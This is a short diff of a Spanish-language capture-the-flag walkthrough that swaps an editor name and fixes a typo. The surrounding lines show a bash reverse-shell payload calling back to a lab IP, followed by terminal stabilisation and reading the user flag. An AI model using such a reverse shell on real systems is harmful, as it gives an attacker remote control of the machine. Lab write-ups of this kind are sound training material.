@@ -138,7 +138,7 @@ Vamos al Burpsuite y en la parte de Decoder es donde nosotros vamos a usar la li
 
 Creamos un archivo que se llame data el cual contendra el comando de la revershell.
 
-❯ **nano data**    
+❯ **nvim data**    
 
 	#!/bin/bash
 	bash -i >& /dev/tcp/10.10.14.13/443 0>&1 
@@ -165,7 +165,7 @@ reset xterm**
 
 Ahora para modificar las dimensiones de nano debemos hacer lo siguiente. 
 stty size Con este comando podemos ver las dimensiones de la consola nano de 24 80 por lo que debemos de modificar ese valor a este
-**stty rows 51 columns 189** Modificamos las dimenesiones de la consola nano 
+**stty rows 51 columns 189** Modificamos las dimensiones de la consola nano 
 
 Despues de eso entramos a la maquina y podemos ir por la flag de User.txt. Pero antes le cambiamos los privilegios al directorio admin para poder entrar y leer la flag con 
 ❯ **chmod +x admin/**
